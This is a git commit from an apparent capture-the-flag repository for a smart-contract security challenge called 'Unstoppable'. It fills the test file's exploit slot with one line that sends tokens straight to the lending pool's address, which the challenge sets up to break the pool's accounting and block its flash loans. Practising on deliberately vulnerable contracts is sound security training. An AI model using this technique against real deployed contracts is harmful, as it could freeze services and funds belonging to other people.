f95c1766c0e6afd89657d980083056c44878b4e6
Haythem Sellami <sellamihaythem96@gmail.com>
2020-09-28 12:18:30 +0200

    exploit unstoppable

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -39,7 +39,7 @@ describe('[Challenge] Unstoppable', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        this.token.transfer(this.pool.address, ether('1'), {from: attacker})
     });
 
     after(async function () {
